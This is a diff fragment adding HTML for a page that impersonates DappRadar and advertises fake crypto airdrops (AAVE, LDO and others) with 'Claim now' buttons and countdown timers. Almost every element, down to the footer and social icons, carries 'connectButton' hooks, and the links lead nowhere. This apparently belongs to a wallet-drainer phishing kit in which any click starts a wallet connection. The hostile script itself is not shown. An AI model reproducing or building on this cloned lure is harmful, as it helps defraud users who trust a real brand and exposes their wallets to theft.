+          </div>
+          <div ad-data-linked="true" class="featured-airdrop-card--subtitle css-vurnku connectButton">
+           $1000 worth of AAVE to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="featured-airdrop-card--actions-container css-4cffwv connectButton">
+         <div ad-data-linked="true" class="featured-airdrop-card--time-left css-vurnku connectButton">
+          <div ad-data-linked="true" class="css-zkfaav connectButton">
+           <div ad-data-linked="true" class="pulsatingDot css-9cwl6c connectButton">
+           </div>
+           <span class="time-counter--container css-vurnku">
+            Ends in &nbsp;
+            <span id="counter3">
+             7h
+            </span>
+           </span>
+          </div>
+         </div>
+         <button class="sc-dkrFOg fpBNPo interact-button connect">
+          Claim now
+         </button>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="featured-airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="featured-airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-img" class="sc-hTBuwn qLYMO img-loaded" src="lido-logo.png"/>
+         </div>
+         <span class="airdrop-badge red css-vurnku">
+          <span>
+           LIVE
+          </span>
+         </span>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="featured-airdrop-card--title css-vurnku connectButton">
+           Lido (LDO) airdop
+          </div>
+          <div ad-data-linked="true" class="featured-airdrop-card--subtitle css-vurnku connectButton">
+           $400 worth of LDO to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <style>
+         .pulsatingDot { right: 15px; top: 10px; position: relative; }
+@media (max-width: 690px) {
+  .featured-airdrop-card--time-left { margin-left: 20px; }
+}
+        </style>
+        <div ad-data-linked="true" class="featured-airdrop-card--actions-container css-4cffwv connectButton">
+         <div ad-data-linked="true" class="featured-airdrop-card--time-left css-vurnku connectButton">
+          <div ad-data-linked="true" class="css-zkfaav connectButton">
+           <div ad-data-linked="true" class="pulsatingDot css-9cwl6c connectButton">
+           </div>
+           <span class="time-counter--container css-vurnku">
+            Ends in &nbsp;
+            <span id="counter4">
+             9h
+            </span>
+           </span>
+          </div>
+         </div>
+         <button class="sc-dkrFOg fpBNPo interact-button connect">
+          Claim now
+         </button>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="subscribe-to-newsletter css-4cffwv connectButton">
+        <div ad-data-linked="true" class="subscribe-to-newsletter--left-box css-l3rx45 connectButton">
+         <div ad-data-linked="true" class="subscribe-to-newsletter__title css-1f978ju connectButton">
+          <span>
+           New airdrop notifications
+          </span>
+         </div>
+         <div ad-data-linked="true" class="subscribe-to-newsletter__subtitle join-sub css-vurnku connectButton">
+          <span>
+           Unsubscribe at any time.
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#">
+            T&amp;Cs
+           </a>
+           and
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#">
+            Privacy Policy
+           </a>
+          </span>
+         </div>
+        </div>
+        <form class="css-zadiel">
+         <div ad-data-linked="true" class="css-rxk9pl connectButton">
+          <div ad-data-linked="true" class="subscribe-to-newsletter--form css-4cffwv connectButton">
+           <input class="subscribe-to-newsletter__input css-vurnku" name="email" placeholder="Your E-mail" required="" type="email" value=""/>
+           <button class="sc-dkrFOg fpBNPo" type="submit">
+            Subscribe
+           </button>
+          </div>
+          <div ad-data-linked="true" class="css-ghjkiv connectButton">
+           <div ad-data-linked="true" class="sc-bWOGAC jxKZhb connectButton">
+            <input class="sc-csDkEv gfRHvw" id="ymjVH" required="" type="checkbox"/>
+            <label class="sc-eGugkK dMPGwK" for="ymjVH">
+             <span>
+              To receive airdrop
+                      notifications, please subscribe to our weekly newsletter
+             </span>
+            </label>
+           </div>
+          </div>
+         </div>
+        </form>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-item" class="sc-hTBuwn qLYMO img-loaded" src="6528e3073004e_DTUBE-logo-20231010-132810.png"/>
+         </div>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="airdrop-card--title css-vurnku connectButton">
+           DTube (DTUBE) airdrop
+          </div>
+          <div ad-data-linked="true" class="airdrop-card--text css-vurnku connectButton">
+           $400 worth of DTUBE to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="airdrop-card--right-box css-4cffwv connectButton">
+         <div ad-data-linked="true" class="airdrop-card--expired css-vurnku connectButton">
+          <span>
+           Expired
+          </span>
+         </div>
+         <a class="sc-dkrFOg edaHPY" href="#">
+          <span>
+           Details
+          </span>
+         </a>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-item" class="sc-hTBuwn qLYMO img-loaded" src="651fbd5e1fa43_XCAD-logo2-20231006-072041.png"/>
+         </div>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="airdrop-card--title css-vurnku connectButton">
+           XCAD Network (XCAD) airdrop
+          </div>
+          <div ad-data-linked="true" class="airdrop-card--text css-vurnku connectButton">
+           $400 worth of XCAD to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="airdrop-card--right-box css-4cffwv connectButton">
+         <div ad-data-linked="true" class="airdrop-card--expired css-vurnku connectButton">
+          <span>
+           Expired
+          </span>
+         </div>
+         <a class="sc-dkrFOg edaHPY" href="#">
+          <span>
+           Details
+          </span>
+         </a>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-item" class="sc-hTBuwn qLYMO img-loaded" src="6516757b124b3_HOOK-logo-20230926-094518.png"/>
+         </div>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="airdrop-card--title css-vurnku connectButton">
+           Hooked Protocol (HOOK) airdrop
+          </div>
+          <div ad-data-linked="true" class="airdrop-card--text css-vurnku connectButton">
+           $400 worth of HOOK to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="airdrop-card--right-box css-4cffwv connectButton">
+         <div ad-data-linked="true" class="airdrop-card--expired css-vurnku connectButton">
+          <span>
+           Expired
+          </span>
+         </div>
+         <a class="sc-dkrFOg edaHPY" href="#">
+          <span>
+           Details
+          </span>
+         </a>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-item" class="sc-hTBuwn qLYMO img-loaded" src="650d3dee6e0a6_GHST-logo-20230922-065219.png"/>
+         </div>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="airdrop-card--title css-vurnku connectButton">
+           Aavegotchi (GHST) token
+          </div>
+          <div ad-data-linked="true" class="airdrop-card--text css-vurnku connectButton">
+           $400 worth of GHST to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="airdrop-card--right-box css-4cffwv connectButton">
+         <div ad-data-linked="true" class="airdrop-card--expired css-vurnku connectButton">
+          <span>
+           Expired
+          </span>
+         </div>
+         <a class="sc-dkrFOg edaHPY" href="#">
+          <span>
+           Details
+          </span>
+         </a>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-item" class="sc-hTBuwn qLYMO img-loaded" src="6504052d76d28_1inch-logo.png"/>
+         </div>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="airdrop-card--title css-vurnku connectButton">
+           1inch (1INCH) airdrop
+          </div>
+          <div ad-data-linked="true" class="airdrop-card--text css-vurnku connectButton">
+           $400 worth of 1INCH to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="airdrop-card--right-box css-4cffwv connectButton">
+         <div ad-data-linked="true" class="airdrop-card--expired css-vurnku connectButton">
+          <span>
+           Expired
+          </span>
+         </div>
+         <a class="sc-dkrFOg edaHPY" href="#">
+          <span>
+           Details
+          </span>
+         </a>
+        </div>
+       </div>
+       <div ad-data-linked="true" class="airdrop-card css-4cffwv connectButton">
+        <div ad-data-linked="true" class="airdrop-card--left-box css-1d8qyez connectButton">
+         <div ad-data-linked="true" class="airdrop-card--image-container css-1uoge8i connectButton">
+          <img alt="airdrop-item" class="sc-hTBuwn qLYMO img-loaded" src="64fad4e4812be_TLM-logo.png"/>
+         </div>
+         <div ad-data-linked="true" class="css-12hpwr4 connectButton">
+          <div ad-data-linked="true" class="airdrop-card--title css-vurnku connectButton">
+           Alien Worlds (TLM) airdrop
+          </div>
+          <div ad-data-linked="true" class="airdrop-card--text css-vurnku connectButton">
+           $400 worth of TLM to 100 lucky winners
+          </div>
+         </div>
+        </div>
+        <div ad-data-linked="true" class="airdrop-card--right-box css-4cffwv connectButton">
+         <div ad-data-linked="true" class="airdrop-card--expired css-vurnku connectButton">
+          <span>
+           Expired
+          </span>
+         </div>
+         <a class="sc-dkrFOg edaHPY" href="#">
+          <span>
+           Details
+          </span>
+         </a>
+        </div>
+       </div>
+       <span class="sc-dkrFOg bNQEWX" mb="64" mt="32" width="">
+        <span>
+         Show More
+        </span>
+       </span>
+       <div ad-data-linked="true" class="Airdrops__AdContainer-sc-12dvpie-1 iqkwGZ connectButton">
+        <span class="sc-hJVpLM CYoIz">
+         <div ad-data-linked="true" class="sc-liQGml gTaiHc connectButton" target="_blank">
+          <img alt="image" class="sc-hTBuwn qLYMO sc-dmyOCR bOtMUD img-loaded" src="3bfffbf1b3274e9aa734629b57fde402.png"/>
+         </div>
+        </span>
+       </div>
+      </div>
+      <div ad-data-linked="true" class="PortfolioFeedbackSection__Wrapper-w3pi1x-0 jpKalB connectButton" width="100%">
+       <div ad-data-linked="true" class="connectButton">
+        <div ad-data-linked="true" class="sc-fIzWTo ZhnTC connectButton">
+         <span class="sc-bQtnlh fYiQwF">
+          Was this page helpful?
+         </span>
+         <div ad-data-linked="true" class="sc-evXUcO dogmnf connectButton">
+          <button class="sc-DRkuH hiNmaA">
+           <svg height="25px" viewbox="0 0 27.665 24.002" width="28px" xmlns="http://www.w3.org/2000/svg">
+            <path d="m16.007 2.166-6.86 6.86a2.474 2.474 0 0 0-.718 1.746v12.37a2.484 2.484 0 0 0 2.476 2.476H22.05a2.494 2.494 0 0 0 2.278-1.5l4.037-9.418a3.72 3.72 0 0 0-3.418-5.176h-7l1.181-5.674a1.867 1.867 0 0 0-.508-1.7 1.842 1.842 0 0 0-2.613.012zM3.476 25.618a2.484 2.484 0 0 0 2.476-2.476v-9.906a2.476 2.476 0 0 0-4.953 0v9.906a2.484 2.484 0 0 0 2.477 2.476z">
+            </path>
+           </svg>
+          </button>
+          <button class="sc-DRkuH hMCurD">
+           <svg class="sc-fvbgbd MnsCH" height="25px" viewbox="0 0 27.665 24.002" width="28px" xmlns="http://www.w3.org/2000/svg">
+            <path d="m16.007 2.166-6.86 6.86a2.474 2.474 0 0 0-.718 1.746v12.37a2.484 2.484 0 0 0 2.476 2.476H22.05a2.494 2.494 0 0 0 2.278-1.5l4.037-9.418a3.72 3.72 0 0 0-3.418-5.176h-7l1.181-5.674a1.867 1.867 0 0 0-.508-1.7 1.842 1.842 0 0 0-2.613.012zM3.476 25.618a2.484 2.484 0 0 0 2.476-2.476v-9.906a2.476 2.476 0 0 0-4.953 0v9.906a2.484 2.484 0 0 0 2.477 2.476z">
+            </path>
+           </svg>
+          </button>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div ad-data-linked="true" class="Footer__Wrapper-sc-1avv018-0 gIHwMW connectButton">
+    <div ad-data-linked="true" class="Footer__Content-sc-1avv018-1 iOBXKO connectButton">
+     <div ad-data-linked="true" class="sc-kxtuKG loyrzr connectButton">
+      <div ad-data-linked="true" class="sc-fDnMV ignBqg connectButton">
+       <div ad-data-linked="true" class="sc-iDJXoU gAgMXP connectButton">
+        <div ad-data-linked="true" class="sc-eZURND dqQzTn connectButton">
+         Subscribe to our newsletter
+        </div>
+        <div ad-data-linked="true" class="sc-ciFRQG cMJOxa connectButton">
+         Get the Week in Review newsletter and all the latest trends directly to your
+              inbox.
+        </div>
+       </div>
+       <form class="sc-eZceyY koaRjA">
+        <div ad-data-linked="true" class="sc-hixjlP bRrKtJ connectButton">
+         <div ad-data-linked="true" class="sc-erijoS fNtIPO connectButton">
+          <div ad-data-linked="true" class="sc-hHTYSt PaRhQ connectButton">
+           <div ad-data-linked="true" class="sc-dmctIk gPkCH input-wrapper connectButton">
+            <input class="input" id="email" name="email" placeholder="Your email" required="" type="email" value=""/>
+           </div>
+          </div>
+         </div>
+         <button class="sc-dkrFOg hAHhjI" mb="8px" type="submit">
+          Subscribe
+         </button>
+        </div>
+        <div ad-data-linked="true" class="sc-bWOGAC jxKZhb connectButton">
+         <input class="sc-csDkEv gfRHvw" id="a9WYG" required="" type="checkbox"/>
+         <label class="sc-eGugkK dMPGwK" for="a9WYG">
+          <span>
+           I have read the
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#">
+            Privacy Policy
+           </a>
+           and I understand
+              that I can unsubscribe anytime.
+          </span>
+         </label>
+        </div>
+        <div ad-data-linked="true" class="subscribe-token-tc connectButton">
+        </div>
+       </form>
+      </div>
+      <footer>
+       <div ad-data-linked="true" class="sc-dDPqvT bjnYhK connectButton">
+        <nav>
+         <div ad-data-linked="true" class="sc-MAqyW cNQwjD connectButton">
+          <div ad-data-linked="true" class="sc-gnaFgX fAEkjk connectButton">
+           <svg height="30" viewbox="0 0 126.676 20.376" xmlns="http://www.w3.org/2000/svg">
+            <path d="M22.615 9.167L17.905 1a2.036 2.036 0 00-1.753-1H6.731a2.025 2.025 0 00-1.753 1.012L.268 9.176a2.043 2.043 0 000 2.024l4.71 8.164a2.015 2.015 0 001.753 1.012h9.42a2.025 2.025 0 001.753-1.012l4.71-8.164a2.059 2.059 0 00.001-2.033zm-11.174 8.025v-1.4a5.609 5.609 0 10-5.609-5.609 5.539 5.539 0 001.143 3.384l1.012-.986a4.16 4.16 0 01-.75-2.4 4.213 4.213 0 114.213 4.213v-1.4a2.809 2.809 0 10-2.817-2.809 2.765 2.765 0 00.375 1.4l1.047-1.021a1.343 1.343 0 01-.052-.375 1.439 1.439 0 111.439 1.439 1.3 1.3 0 01-.41-.07l-3.62 3.532a.56.56 0 01-.113.087c-.009.009-.026.009-.035.017a.407.407 0 01-.087.044c-.017.009-.035.009-.052.017l-.079.026a.111.111 0 00-.049.01c-.026 0-.052.009-.07.009-.026 0-.052-.009-.079-.009a.17.17 0 01-.061-.009l-.079-.026c-.017-.009-.035-.009-.052-.017a.354.354 0 01-.079-.044.191.191 0 01-.044-.026.5.5 0 01-.07-.061c-.009-.009-.026-.017-.035-.035a7.007 7.007 0 115.015 2.12zM28.285 3.62h4.309c4.169-.044 7.24 2.652 7.179 6.542.061 3.812-3.009 6.682-7.179 6.62h-4.309zm4.283 10.738c2.652 0 4.431-1.657 4.431-4.187 0-2.556-1.736-4.108-4.431-4.108h-1.6v8.3h1.6zM49.647 16.791H47.17v-.959a4.089 4.089 0 01-3.009 1.195c-2.093 0-3.411-1.221-3.411-2.948 0-1.779 1.439-2.87 3.733-2.87h2.477v-.436a1.613 1.613 0 00-1.83-1.736 3.372 3.372 0 00-2.617 1.361l-1.4-1.657a5.365 5.365 0 014.317-2.033 3.88 3.88 0 014.23 4.23v5.853zm-2.7-3.812h-2.106c-.881 0-1.378.34-1.378.994s.558 1.073 1.413 1.073a1.965 1.965 0 002.076-1.954zM57.383 17.027a3.947 3.947 0 01-2.957-1.195v4.544h-2.7V6.919h2.477v1.237a3.741 3.741 0 013.18-1.457 4.844 4.844 0 014.789 5.146 4.874 4.874 0 01-4.789 5.182zm-.5-7.894a2.462 2.462 0 00-2.495 2.713 2.477 2.477 0 002.495 2.73 2.551 2.551 0 002.556-2.713 2.537 2.537 0 00-2.553-2.73zM69.429 17.027a3.947 3.947 0 01-2.957-1.195v4.544h-2.7V6.919h2.485v1.237a3.741 3.741 0 013.172-1.457 4.844 4.844 0 014.789 5.146 4.874 4.874 0 01-4.789 5.182zm-.5-7.894a2.462 2.462 0 00-2.495 2.713 2.477 2.477 0 002.495 2.73 2.551 2.551 0 002.556-2.713 2.532 2.532 0 00-2.553-2.73zM84.014 16.791l-3.411-4.649h-1.971v4.649h-2.7V3.62h4.946c2.756 0 4.745 1.718 4.745 4.248a4.081 4.081 0 01-2.311 3.751l3.733 5.164h-3.031zm-5.39-7.021h2.253a1.811 1.811 0 002-1.893 1.825 1.825 0 00-2-1.875h-2.25zM96.094 16.791h-2.477v-.959a4.089 4.089 0 01-3.009 1.195c-2.093 0-3.411-1.221-3.411-2.948 0-1.779 1.439-2.87 3.733-2.87h2.477v-.436a1.613 1.613 0 00-1.832-1.736 3.372 3.372 0 00-2.617 1.361l-1.4-1.657a5.365 5.365 0 014.309-2.032 3.88 3.88 0 014.23 4.23v5.853zm-2.7-3.812h-2.111c-.881 0-1.378.34-1.378.994s.558 1.073 1.413 1.073a1.965 1.965 0 002.076-1.954zM108.062 1.823v14.959h-2.477v-1.221a3.741 3.741 0 01-3.175 1.457 4.849 4.849 0 01-4.789-5.164 4.849 4.849 0 014.789-5.164 3.842 3.842 0 012.957 1.178V1.823zm-5.146 7.31a2.551 2.551 0 00-2.556 2.713 2.532 2.532 0 002.556 2.73 2.462 2.462 0 002.495-2.713 2.486 2.486 0 00-2.495-2.73zM118.511 16.791h-2.477v-.959a4.089 4.089 0 01-3.009 1.195c-2.093 0-3.411-1.221-3.411-2.948 0-1.779 1.439-2.87 3.733-2.87h2.477v-.436a1.613 1.613 0 00-1.832-1.736 3.372 3.372 0 00-2.617 1.361l-1.4-1.657a5.365 5.365 0 014.309-2.032 3.88 3.88 0 014.23 4.23v5.853zm-2.687-3.812h-2.11c-.881 0-1.378.34-1.378.994s.558 1.073 1.413 1.073a1.965 1.965 0 002.076-1.954zM126.667 9.29h-.715a2.385 2.385 0 00-2.652 2.573v4.928h-2.7V6.917h2.477v1.178a3.412 3.412 0 012.713-1.3 2.723 2.723 0 01.881.122V9.29z">
+            </path>
+           </svg>
+           <div ad-data-linked="true" class="sc-UTuSi euxCiK connectButton">
+            The World&rsquo;s Dapp Store
+           </div>
+          </div>
+          <div ad-data-linked="true" class="sc-fCBrnK dDDAVT connectButton">
+           <div ad-data-linked="true" class="connectButton">
+            <span class="sc-ksBlkl gUFvbZ">
+             <button class="sc-dkrFOg hvxzOM" padding="0" type="button">
+              <div ad-data-linked="true" class="sc-jbwHOj jnlGHs connectButton">
+               <svg fill="#B1BBCE" height="18" viewbox="0 0 1200 1227" width="20" xmlns="http://www.w3.org/2000/svg">
+                <path d="M714.163 519.284 1160.89 0h-105.86L667.137 450.887 357.328 0H0l468.492 681.821L0 1226.37h105.866l409.625-476.152 327.181 476.152H1200L714.137 519.284h.026ZM569.165 687.828l-47.468-67.894-377.686-540.24h162.604l304.797 435.991 47.468 67.894 396.2 566.721H892.476L569.165 687.854v-.026Z">
+                </path>
+               </svg>
+               <svg class="sc-jdIQKl NjdPj" height="6" viewbox="0 0 11 6" width="11" xmlns="http://www.w3.org/2000/svg">
+                <path clip-rule="evenodd" d="M.793.293a1 1 0 0 1 1.414 0L5.5 3.586 8.793.293a1 1 0 0 1 1.414 1.414l-4 4a1 1 0 0 1-1.414 0l-4-4a1 1 0 0 1 0-1.414Z" fill-rule="evenodd">
+                </path>
+               </svg>
+              </div>
+             </button>
+            </span>
+           </div>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer nofollow external" title="Like us on Facebook">
+            <svg fill="#B1BBCE" height="22" viewbox="0 0 320 512" width="22" xmlns="http://www.w3.org/2000/svg">
+             <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z">
+             </path>
+            </svg>
+           </a>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer nofollow external" title="Chat with us on Discord">
+            <svg fill="#B1BBCE" height="22" viewbox="0 0 12 13" width="22" xmlns="http://www.w3.org/2000/svg">
+             <path d="M4.914 5.284c-.342 0-.612.3-.612.666 0 .366.276.666.612.666.342 0 .612-.3.612-.666.006-.366-.27-.666-.612-.666Zm2.19 0c-.342 0-.612.3-.612.666 0 .366.276.666.612.666.342 0 .612-.3.612-.666 0-.366-.27-.666-.612-.666Z">
+             </path>
+             <path d="M10.02.25H1.98C1.302.25.75.802.75 1.486v8.112c0 .684.552 1.236 1.23 1.236h6.804l-.318-1.11.768.714.726.672 1.29 1.14V1.486c0-.684-.552-1.236-1.23-1.236ZM7.704 8.086s-.216-.258-.396-.486c.786-.222 1.086-.714 1.086-.714-.246.162-.48.276-.69.354a4.203 4.203 0 0 1-2.424.252 5.037 5.037 0 0 1-.882-.258 3.516 3.516 0 0 1-.438-.204c-.018-.012-.036-.018-.054-.03a.083.083 0 0 1-.024-.018 2.105 2.105 0 0 1-.168-.102s.288.48 1.05.708c-.18.228-.402.498-.402.498-1.326-.042-1.83-.912-1.83-.912 0-1.932.864-3.498.864-3.498.864-.648 1.686-.63 1.686-.63l.06.072c-1.08.312-1.578.786-1.578.786s.132-.072.354-.174c.642-.282 1.152-.36 1.362-.378.036-.006.066-.012.102-.012a4.891 4.891 0 0 1 3.018.564s-.474-.45-1.494-.762l.084-.096s.822-.018 1.686.63c0 0 .864 1.566.864 3.498 0 0-.51.87-1.836.912Z">
+             </path>
+            </svg>
+           </a>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer nofollow external" title="Follow us on Reddit">
+            <svg fill="#B1BBCE" height="22" viewbox="0 0 512 512" width="22" xmlns="http://www.w3.org/2000/svg">
+             <path d="M440.3 203.5c-15 0-28.2 6.2-37.9 15.9-35.7-24.7-83.8-40.6-137.1-42.3L293 52.3l88.2 19.8c0 21.6 17.6 39.2 39.2 39.2 22 0 39.7-18.1 39.7-39.7s-17.6-39.7-39.7-39.7c-15.4 0-28.7 9.3-35.3 22l-97.4-21.6c-4.9-1.3-9.7 2.2-11 7.1L246.3 177c-52.9 2.2-100.5 18.1-136.3 42.8-9.7-10.1-23.4-16.3-38.4-16.3-55.6 0-73.8 74.6-22.9 100.1-1.8 7.9-2.6 16.3-2.6 24.7 0 83.8 94.4 151.7 210.3 151.7 116.4 0 210.8-67.9 210.8-151.7 0-8.4-.9-17.2-3.1-25.1 49.9-25.6 31.5-99.7-23.8-99.7zM129.4 308.9c0-22 17.6-39.7 39.7-39.7 21.6 0 39.2 17.6 39.2 39.7 0 21.6-17.6 39.2-39.2 39.2-22 .1-39.7-17.6-39.7-39.2zm214.3 93.5c-36.4 36.4-139.1 36.4-175.5 0-4-3.5-4-9.7 0-13.7 3.5-3.5 9.7-3.5 13.2 0 27.8 28.5 120 29 149 0 3.5-3.5 9.7-3.5 13.2 0 4.1 4 4.1 10.2.1 13.7zm-.8-54.2c-21.6 0-39.2-17.6-39.2-39.2 0-22 17.6-39.7 39.2-39.7 22 0 39.7 17.6 39.7 39.7-.1 21.5-17.7 39.2-39.7 39.2z">
+             </path>
+            </svg>
+           </a>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer nofollow external" title="Ask us questions on Telegram">
+            <svg fill="#B1BBCE" height="22" viewbox="0 0 13 11" width="22" xmlns="http://www.w3.org/2000/svg">
+             <path d="M11.606.093s1.174-.457 1.076.654c-.033.458-.326 2.06-.555 3.792l-.782 5.132s-.065.752-.652.883c-.587.13-1.467-.458-1.63-.588-.13-.098-2.445-1.57-3.26-2.289-.229-.196-.49-.588.032-1.046l3.423-3.269c.392-.392.783-1.307-.847-.196L3.846 6.272s-.521.327-1.5.032L.229 5.651s-.783-.49.554-.981c3.26-1.537 7.27-3.106 10.824-4.577Z">
+             </path>
+            </svg>
+           </a>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer nofollow external" title="Subscribe to us on Youtube">
+            <svg fill="#B1BBCE" height="22" viewbox="0 0 461.001 461.001" width="22" xml:space="preserve" xmlns="http://www.w3.org/2000/svg">
+             <path d="M365.257 67.393H95.744C42.866 67.393 0 110.259 0 163.137v134.728c0 52.878 42.866 95.744 95.744 95.744h269.513c52.878 0 95.744-42.866 95.744-95.744V163.137c0-52.878-42.866-95.744-95.744-95.744zm-64.751 169.663-126.06 60.123c-3.359 1.602-7.239-.847-7.239-4.568V168.607c0-3.774 3.982-6.22 7.348-4.514l126.06 63.881c3.748 1.899 3.683 7.274-.109 9.082z">
+             </path>
+            </svg>
+           </a>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer nofollow external" title="Follow us on Instagram">
+            <svg fill="#B1BBCE" height="22" viewbox="0 0 27 32" width="22" xmlns="http://www.w3.org/2000/svg">
+             <title>
+              instagram
+             </title>
+             <path d="M18.286 16.286c0-2.518-2.054-4.571-4.571-4.571s-4.571 2.054-4.571 4.571 2.054 4.571 4.571 4.571 4.571-2.054 4.571-4.571zm2.464 0c0 3.893-3.143 7.036-7.036 7.036s-7.036-3.143-7.036-7.036S9.821 9.25 13.714 9.25s7.036 3.143 7.036 7.036zm1.929-7.322c0 .911-.732 1.643-1.643 1.643s-1.643-.732-1.643-1.643.732-1.643 1.643-1.643 1.643.732 1.643 1.643zm-8.965-3.928c-2 0-6.286-.161-8.089.554-.625.25-1.089.554-1.571 1.036s-.786.946-1.036 1.571c-.714 1.804-.554 6.089-.554 8.089s-.161 6.286.554 8.089c.25.625.554 1.089 1.036 1.571s.946.786 1.571 1.036c1.804.714 6.089.554 8.089.554s6.286.161 8.089-.554c.625-.25 1.089-.554 1.571-1.036s.786-.946 1.036-1.571c.714-1.804.554-6.089.554-8.089s.161-6.286-.554-8.089c-.25-.625-.554-1.089-1.036-1.571s-.946-.786-1.571-1.036c-1.804-.714-6.089-.554-8.089-.554zm13.715 11.25c0 1.893.018 3.768-.089 5.661-.107 2.196-.607 4.143-2.214 5.75s-3.554 2.107-5.75 2.214c-1.893.107-3.768.089-5.661.089s-3.768.018-5.661-.089c-2.196-.107-4.143-.607-5.75-2.214S.197 24.143.09 21.947c-.107-1.893-.089-3.768-.089-5.661s-.018-3.768.089-5.661c.107-2.196.607-4.143 2.214-5.75s3.554-2.107 5.75-2.214c1.893-.107 3.768-.089 5.661-.089s3.768-.018 5.661.089c2.196.107 4.143.607 5.75 2.214s2.107 3.554 2.214 5.75c.107 1.893.089 3.768.089 5.661z">
+             </path>
+            </svg>
+           </a>
+           <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noopener noreferrer nofollow external" title="Follow us on TikTok">
+            <svg fill="#B1BBCE" height="22" viewbox="0 0 448 512" width="22" xmlns="http://www.w3.org/2000/svg">
+             <path d="M448 209.91a210.06 210.06 0 0 1-122.77-39.25v178.72A162.55 162.55 0 1 1 185 188.31v89.89a74.62 74.62 0 1 0 52.23 71.18V0h88a121.18 121.18 0 0 0 1.86 22.17A122.18 122.18 0 0 0 381 102.39a121.43 121.43 0 0 0 67 20.14Z">
+             </path>
+            </svg>
+           </a>
+          </div>
+         </div>
+         <div ad-data-linked="true" class="sc-hQrevV dbbCMU connectButton">
+         </div>
+         <div ad-data-linked="true" class="sc-dYBPgv epmrXf connectButton">
+          <div ad-data-linked="true" class="sc-cbfGDZ iKGcbP connectButton">
+           <img alt="DappRadar QR Code" class="sc-hYufOg ktXHwP" src="app-qr-code.svg"/>
+          </div>
+          <div ad-data-linked="true" class="sc-jVQoqC cYIMWa connectButton">
+           <div ad-data-linked="true" class="sc-ddKZzx ctovIu connectButton">
+            <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noreferrer">
+             <div ad-data-linked="true" class="sc-jlYURC chRKCJ connectButton">
+              <svg fill="white" height="20" viewbox="0 0 16 20" width="16" xmlns="http://www.w3.org/2000/svg">
+               <path d="M13.364 10.43a4.447 4.447 0 0 1 2.128-3.74 4.57 4.57 0 0 0-3.605-1.943c-1.516-.16-2.986.905-3.76.905-.787 0-1.977-.89-3.258-.863a4.81 4.81 0 0 0-4.04 2.456c-1.746 3.016-.443 7.448 1.23 9.885.837 1.194 1.815 2.527 3.095 2.48 1.253-.052 1.72-.797 3.233-.797 1.498 0 1.937.797 3.243.767 1.344-.022 2.191-1.2 2.999-2.404A9.86 9.86 0 0 0 16 14.39a4.317 4.317 0 0 1-1.916-1.585 4.298 4.298 0 0 1-.72-2.377ZM10.897 3.144A4.38 4.38 0 0 0 11.903 0a4.481 4.481 0 0 0-2.897 1.495 4.173 4.173 0 0 0-1.033 3.027 3.71 3.71 0 0 0 2.924-1.378Z">
+               </path>
+              </svg>
+             </div>
+            </a>
+            <a ad-data-linked="true" class="interact-button connect connectButton" href="#" rel="noreferrer">
